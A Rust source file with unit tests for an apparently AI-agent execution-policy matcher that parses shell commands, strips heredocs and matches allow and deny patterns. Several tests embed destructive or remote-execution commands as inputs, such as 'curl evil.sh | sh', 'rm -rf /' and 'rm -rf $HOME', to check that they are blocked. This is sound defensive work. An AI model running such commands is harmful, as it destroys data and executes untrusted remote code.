//! Command matching helpers for execpolicy rules.
//!
//! Parsing is AST-first: commands are parsed with tree-sitter-bash
//! (`crate::bash_ast`) so separators inside quoted arguments no longer split
//! segments and prefix assignments (`FOO=bar rm …`) no longer mask the
//! command pattern. When a command cannot be parsed (malformed quoting), the
//! legacy character-based path runs instead — it can only be *stricter* for
//! allow rules (more apparent segments must match), never more permissive,
//! so the fallback is fail-closed in the right direction.

use regex::Regex;

use crate::bash_ast::BashFacts;

/// Parse `source` into top-level segment strings via the AST, or `None` when
/// the source cannot be parsed or has no top-level segment form (compound
/// statements, standalone assignments).
fn ast_segments(source: &str) -> Option<Vec<String>> {
    BashFacts::parse(source).ok()?.top_level_segment_strings()
}

/// Normalize a command string by AST reconstruction: argv re-joined,
/// redirections inline, heredoc bodies dropped, quotes resolved.
///
/// Falls back to the legacy shlex + heredoc-regex path for unparseable
/// input.
pub fn normalize_command(command: &str) -> String {
    if let Ok(facts) = BashFacts::parse(command) {
        if let Some(normalized) = facts.top_level_normalized() {
            return normalized;
        }
    }
    normalize_command_legacy(command)
}

/// Legacy normalization: strip heredoc bodies with a regex state machine,
/// then shlex-split and re-join tokens. Kept as the fallback for input the
/// bash grammar cannot parse.
fn normalize_command_legacy(command: &str) -> String {
    let stripped = strip_heredoc_bodies(command);
    if let Some(tokens) = shlex::split(&stripped) {
        tokens.join(" ")
    } else {
        stripped
            .split_whitespace()
            .filter(|token| !token.is_empty())
            .collect::<Vec<_>>()
            .join(" ")
    }
}

/// Strip heredoc bodies from a multi-line command string.
///
/// Recognises the common forms:
///
/// * `<<DELIM` — body until line equal to `DELIM`.
/// * `<<-DELIM` — body until line equal to `DELIM` (tabs stripped
///   in real shell; we keep the delimiter match the same).
/// * `<<'DELIM'` / `<<"DELIM"` — quoted delimiter; quotes peeled
///   for the closing match.
///
/// The here-string operator `<<<` is intentionally not stripped —
/// its body is the next token on the same line, not separate lines,
/// and shlex tokenizes it correctly.
fn strip_heredoc_bodies(command: &str) -> String {
    if !command.contains("<<") {
        return command.to_string();
    }
    // Sidestep the here-string operator (`<<<`) by replacing it
    // with a placeholder before running the heredoc regex, then
    // restoring it after. Rust's `regex` crate doesn't support
    // lookbehind, so we can't write "match `<<` only when not
    // preceded by `<`" directly; this preprocessing achieves the
    // same outcome.
    const HERESTRING_PLACEHOLDER: &str = "\u{0001}HERESTRING\u{0001}";
    let command_owned: String = command.replace("<<<", HERESTRING_PLACEHOLDER);
    let command: &str = &command_owned;

    // Lazy-init the heredoc-start regex. Allows whitespace / `-`
    // between `<<` and the delimiter, accepts optional `'` / `"`
    // around the delimiter name. The delimiter is a typical
    // shell identifier (alphanumeric + underscore).
    static HEREDOC_RE_INIT: std::sync::OnceLock<Regex> = std::sync::OnceLock::new();
    let re = HEREDOC_RE_INIT.get_or_init(|| {
        Regex::new(r#"<<-?\s*(?:['"]?)([A-Za-z_][A-Za-z0-9_]*)(?:['"]?)"#)
            .expect("heredoc regex compiles")
    });

    let mut out = String::with_capacity(command.len());
    let mut lines = command.lines();
    while let Some(line) = lines.next() {
        // Detect heredoc on this line, capture the delimiter, and
        // strip the `<<DELIM` operator from the line so downstream
        // tokenizers don't see it in the pattern. A single line can
        // have multiple heredocs (rare but legal: `cmd <<A <<B`);
        // we strip every match on the line and consume until the
        // *last* delimiter (the matching shell behavior is to stack
        // them, but for pattern-match purposes they all collapse).
        let mut delim: Option<String> = None;
        let mut redacted = line.to_string();
        for cap in re.captures_iter(line) {
            // A `<<DELIM` inside a quoted argument (`git commit -m "see <<EOF
            // docs"`) is not a heredoc — skip matches that sit inside a
            // quote region so they can't trigger body consumption.
            let at_top_level = cap
                .get(0)
                .is_some_and(|m| quote_state_is_clean_at(line, m.start()));
            if !at_top_level {
                continue;
            }
            // Strip the entire `<<DELIM` text from the line.
            let whole = cap.get(0).map_or("", |m| m.as_str());
            redacted = redacted.replace(whole, "");
            // Track the last-seen delimiter for body consumption.
            delim = cap.get(1).map(|m| m.as_str().to_string());
        }
        // Trim any double-spaces left after stripping.
        let cleaned = redacted
            .split_whitespace()
            .filter(|t| !t.is_empty())
            .collect::<Vec<_>>()
            .join(" ");
        out.push_str(&cleaned);
        out.push('\n');
        if let Some(d) = delim {
            // Skip body lines until we hit the matching delimiter.
            let mut consumed: Vec<&str> = Vec::new();
            let mut terminated = false;
            for body_line in lines.by_ref() {
                if body_line.trim() == d {
                    terminated = true;
                    break;
                }
                consumed.push(body_line);
            }
            if !terminated {
                // Unterminated heredoc (missing `EOF` line, or the `<<` was
                // somewhere the shell wouldn't treat as an operator): emit
                // the consumed lines back so pattern matching still sees
                // the rest of the script instead of silently hiding it.
                for body_line in consumed {
                    out.push_str(body_line);
                    out.push('\n');
                }
            }
        }
    }
    // Restore the here-string operator we hid before regex matching.
    out.replace(HERESTRING_PLACEHOLDER, "<<<")
}

/// Whether the byte `offset` in `line` sits outside any single- or
/// double-quoted region (shell-style: `\` escapes outside single quotes).
fn quote_state_is_clean_at(line: &str, offset: usize) -> bool {
    let bytes = line.as_bytes();
    let mut in_single = false;
    let mut in_double = false;
    let mut i = 0;
    while i < offset && i < bytes.len() {
        match bytes[i] {
            b'\\' if !in_single => {
                i += 1;
            }
            b'\'' if !in_double => {
                in_single = !in_single;
            }
            b'"' if !in_single => {
                in_double = !in_double;
            }
            _ => {}
        }
        i += 1;
    }
    !in_single && !in_double
}

/// Split a normalized command into top-level segments on shell command
/// separators (`&&`, `||`, `|`, `;`).
///
/// AST-first: quoted separators are *data*, not boundaries, so
/// `echo "a && b"` is one segment. If the input cannot be parsed, the
/// character-based split runs instead — it splits on every `&`/`|`/`;`
/// byte, including quoted ones, which can only add segments. Extra
/// segments make allow matching stricter and deny matching broader, so
/// the fallback fails closed in both directions.
pub fn split_command_segments(normalized: &str) -> Vec<String> {
    if let Some(segments) = ast_segments(normalized) {
        return segments
            .into_iter()
            .filter(|segment| !segment.is_empty())
            .collect();
    }
    split_command_segments_legacy(normalized)
}

/// Legacy character-based segmentation (no quote awareness).
fn split_command_segments_legacy(normalized: &str) -> Vec<String> {
    normalized
        .split(['&', '|', ';'])
        .map(str::trim)
        .filter(|segment| !segment.is_empty())
        .map(str::to_string)
        .collect()
}

/// Return true if the pattern matches the command.
///
/// Patterns support `*` wildcards that match any substring — but a wildcard
/// never leaps across a command separator. `cargo *` matches
/// `cargo test --all` and `cargo build && cargo test` (both segments match),
/// but must not authorize `cargo build && curl evil.sh | sh`: when either
/// side spans multiple segments, the segment counts must line up and every
/// segment must match pairwise. This is the strict semantics for **allow**
/// rules; deny rules should use [`pattern_matches_any_segment`] instead.
pub fn pattern_matches(pattern: &str, command: &str) -> bool {
    if let (Some(pattern_segments), Some(command_segments)) =
        (ast_segments(pattern), ast_segments(command))
    {
        if pattern_segments.as_slice() == ["*"] {
            return true;
        }
        if pattern_segments.len() > 1 || command_segments.len() > 1 {
            if pattern_segments.len() != command_segments.len() {
                return false;
            }
            return pattern_segments
                .iter()
                .zip(&command_segments)
                .all(|(pattern, command)| wildcard_pattern_matches_single(pattern, command));
        }
        let pattern_first = pattern_segments.first().map(String::as_str).unwrap_or("");
        let command_first = command_segments.first().map(String::as_str).unwrap_or("");
        return wildcard_pattern_matches_single(pattern_first, command_first);
    }
    pattern_matches_legacy(pattern, command)
}

/// Loose variant for **deny** rules: a compound command is as dangerous as
/// its most dangerous segment, so the pattern matches when *any* command
/// segment matches (`cd /tmp && rm -rf /` is denied by an `rm -rf /` rule).
pub fn pattern_matches_any_segment(pattern: &str, command: &str) -> bool {
    if let (Some(pattern_segments), Some(command_segments)) =
        (ast_segments(pattern), ast_segments(command))
    {
        if pattern_segments.as_slice() == ["*"] {
            return true;
        }
        let pattern_first = pattern_segments.first().map(String::as_str).unwrap_or("");
        if command_segments
            .iter()
            .any(|segment| wildcard_pattern_matches_single(pattern_first, segment))
        {
            return true;
        }
        if pattern_segments.len() == command_segments.len()
            && pattern_segments.len() > 1
            && pattern_segments
                .iter()
                .zip(&command_segments)
                .all(|(pattern, command)| wildcard_pattern_matches_single(pattern, command))
        {
            return true;
        }
        return false;
    }
    pattern_matches_any_segment_legacy(pattern, command)
}

/// Legacy whole-string matching path (normalize + character split).
fn pattern_matches_legacy(pattern: &str, command: &str) -> bool {
    let pattern = normalize_command_legacy(pattern);
    let command = normalize_command_legacy(command);

    if pattern == "*" {
        return true;
    }

    let pattern_segments = split_command_segments_legacy(&pattern);
    let command_segments = split_command_segments_legacy(&command);
    if pattern_segments.len() > 1 || command_segments.len() > 1 {
        if pattern_segments.len() != command_segments.len() {
            return false;
        }
        return pattern_segments
            .iter()
            .zip(&command_segments)
            .all(|(pattern, command)| wildcard_pattern_matches_single(pattern, command));
    }
    wildcard_pattern_matches_single(&pattern, &command)
}

/// Legacy any-segment deny path.
fn pattern_matches_any_segment_legacy(pattern: &str, command: &str) -> bool {
    let pattern = normalize_command_legacy(pattern);
    let command = normalize_command_legacy(command);

    if pattern == "*" {
        return true;
    }

    let command_segments = split_command_segments_legacy(&command);
    if command_segments.len() <= 1 {
        return wildcard_pattern_matches_single(&pattern, &command);
    }
    command_segments
        .iter()
        .any(|segment| wildcard_pattern_matches_single(&pattern, segment))
        || pattern_matches_legacy(&pattern, &command)
}

fn wildcard_pattern_matches_single(pattern: &str, command: &str) -> bool {
    let escaped = regex::escape(pattern).replace("\\*", ".*");
    let Ok(re) = Regex::new(&format!("^{escaped}$")) else {
        return false;
    };
    re.is_match(command)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_normalize_command() {
        assert_eq!(normalize_command("git   status"), "git status");
        assert_eq!(
            normalize_command("git \"log --oneline\""),
            "git log --oneline"
        );
    }

    #[test]
    fn test_pattern_matches() {
        assert!(pattern_matches("git status", "git status"));
        assert!(pattern_matches("git log *", "git log --oneline"));
        assert!(pattern_matches("cargo *", "cargo test --all"));
        assert!(!pattern_matches("git push --force", "git push origin main"));
    }

    #[test]
    fn strip_heredoc_strips_simple_body() {
        let cmd = "cat <<EOF > file.txt\nhello\nworld\nEOF";
        let stripped = super::strip_heredoc_bodies(cmd);
        // Body lines `hello` and `world` are gone; the delimiter
        // `EOF` line is also consumed.
        assert!(!stripped.contains("hello"));
        assert!(!stripped.contains("world"));
        // The redirect target survives.
        assert!(stripped.contains("> file.txt"));
    }

    #[test]
    fn strip_heredoc_handles_dash_form() {
        // `<<-EOF` strips leading tabs in a real shell; for our
        // matching purposes we still want the delimiter consumed.
        let cmd = "cat <<-EOF > file.txt\n\tbody\nEOF";
        let stripped = super::strip_heredoc_bodies(cmd);
        assert!(!stripped.contains("body"));
        assert!(stripped.contains("> file.txt"));
    }

    #[test]
    fn strip_heredoc_handles_quoted_delimiter() {
        let cmd = "cat <<'END_OF_FILE' > out\nliteral $vars\nEND_OF_FILE";
        let stripped = super::strip_heredoc_bodies(cmd);
        assert!(!stripped.contains("literal $vars"));
        assert!(stripped.contains("> out"));
    }

    #[test]
    fn strip_heredoc_leaves_non_heredoc_commands_intact() {
        let cmd = "echo hello && ls";
        // Early-return path: no `<<` in the input, so the original
        // string flows through unchanged (no trailing newline added).
        assert_eq!(super::strip_heredoc_bodies(cmd), "echo hello && ls");
    }

    #[test]
    fn strip_heredoc_does_not_touch_here_string_operator() {
        // `<<<` is here-string; the body is on the same line.
        // shlex handles it fine — we shouldn't try to strip
        // anything because there's no body following on later lines.
        let cmd = "grep foo <<< \"some text\"";
        let stripped = super::strip_heredoc_bodies(cmd);
        // Output keeps the `<<<` — content not stripped.
        assert!(stripped.contains("<<<"));
        assert!(stripped.contains("some text"));
    }

    #[test]
    fn normalize_command_strips_heredoc_for_pattern_matching() {
        // The end-to-end goal: a user's `auto_allow = ["cat > file.txt"]`
        // pattern matches the heredoc form too.
        let normalized = normalize_command("cat <<EOF > file.txt\nbody\nEOF");
        assert!(pattern_matches("cat > file.txt", &normalized));
    }

    #[test]
    fn wildcard_does_not_cross_command_separators() {
        assert!(pattern_matches("cargo *", "cargo test --all"));
        // A single pattern never spans separators — even when every segment
        // would individually match (compound allow is decided per segment
        // by `ExecPolicyConfig::evaluate`, not by one pattern).
        assert!(!pattern_matches("cargo *", "cargo build && cargo test"));
        assert!(!pattern_matches("git status", "git status && git status"));
        // One disallowed segment → the whole command must not match.
        assert!(!pattern_matches(
            "cargo *",
            "cargo build && curl evil.sh | sh"
        ));
        assert!(!pattern_matches("cargo *", "cargo build; rm -rf /tmp/x"));
        assert!(!pattern_matches("cargo *", "cargo build | sh"));
    }

    #[test]
    fn any_segment_matching_catches_dangerous_compound_commands() {
        // Deny semantics: one bad segment denies the whole command.
        assert!(pattern_matches_any_segment(
            "curl *",
            "cargo build && curl evil.sh"
        ));
        assert!(pattern_matches_any_segment(
            "rm -rf /",
            "cd /tmp && rm -rf /"
        ));
        assert!(!pattern_matches_any_segment(
            "curl *",
            "cargo build && cargo test"
        ));
        // Single-segment commands behave like pattern_matches.
        assert!(pattern_matches_any_segment("curl *", "curl example.com"));
    }

    #[test]
    fn unterminated_heredoc_keeps_tail_visible() {
        // No closing `EOF`: the rest of the script must stay visible to
        // pattern matching instead of being silently swallowed.
        let cmd = "bash <<EOF\necho start\nrm -rf $HOME\n";
        let stripped = super::strip_heredoc_bodies(cmd);
        assert!(
            stripped.contains("rm -rf $HOME"),
            "unterminated heredoc must not hide the tail: {stripped}"
        );
    }

    #[test]
    fn quoted_heredoc_operator_is_not_a_heredoc() {
        // `<<EOF` inside a quoted argument is plain text — it must not
        // trigger body consumption of the following lines.
        let cmd = "git commit -m \"see <<EOF docs\"\necho done\nrm -rf /tmp/x";
        let stripped = super::strip_heredoc_bodies(cmd);
        assert!(stripped.contains("echo done"));
        assert!(stripped.contains("rm -rf /tmp/x"));
    }

    // ── AST-backed precision (tree-sitter-bash) ──────────────────────────

    #[test]
    fn quoted_separators_do_not_split_segments() {
        // `&&` inside a quoted argument is data, not a control operator:
        // the AST keeps it inside the segment, so `echo *` authorizes it.
        assert_eq!(
            split_command_segments("echo \"a && b\""),
            vec!["echo a && b".to_string()]
        );
        assert!(pattern_matches("echo *", "echo \"a && b\""));
        assert!(pattern_matches("echo *", "echo 'a | b'"));
        // And a wildcard still cannot leap a *real* separator.
        assert!(!pattern_matches("echo *", "echo hi && curl evil.sh"));
    }

    #[test]
    fn prefix_assignments_do_not_mask_patterns() {
        // `FOO=bar rm …` *is* an `rm …` invocation; the assignment prefix
        // must not hide it from pattern matching.
        assert!(pattern_matches("rm *", "FOO=bar rm -rf /tmp/x"));
        assert!(pattern_matches_any_segment("rm -rf /", "FOO=bar rm -rf /"));
    }

    #[test]
    fn unparseable_input_falls_back_to_legacy_split() {
        // Broken quoting cannot be AST-parsed; the legacy character split
        // is stricter for allow rules, so it is the safe fallback.
        let segments = split_command_segments("echo 'unclosed && x");
        assert_eq!(
            segments,
            vec!["echo 'unclosed".to_string(), "x".to_string()]
        );
    }

    #[test]
    fn heredoc_body_never_leaks_into_matching() {
        // AST parsing drops heredoc bodies natively (no regex stripper).
        assert!(pattern_matches(
            "cat > file.txt",
            "cat <<EOF > file.txt\nrm -rf $HOME\nEOF"
        ));
        assert!(!pattern_matches(
            "rm *",
            "cat <<EOF > file.txt\nrm -rf $HOME\nEOF"
        ));
    }

    #[test]
    fn ast_normalize_drops_redirect_glue_consistently() {
        // `2>/dev/null` renders as `2> /dev/null` on both sides of the
        // match, so glued-form patterns still hit.
        assert!(
            pattern_matches(
                "cargo build 2>/dev/null",
                "cargo build 2>/dev/null && cargo test"
            ) == false
        ); // one pattern segment vs two command segments
        assert!(pattern_matches(
            "cargo build 2> *",
            "cargo build 2>/dev/null"
        ));
    }
}
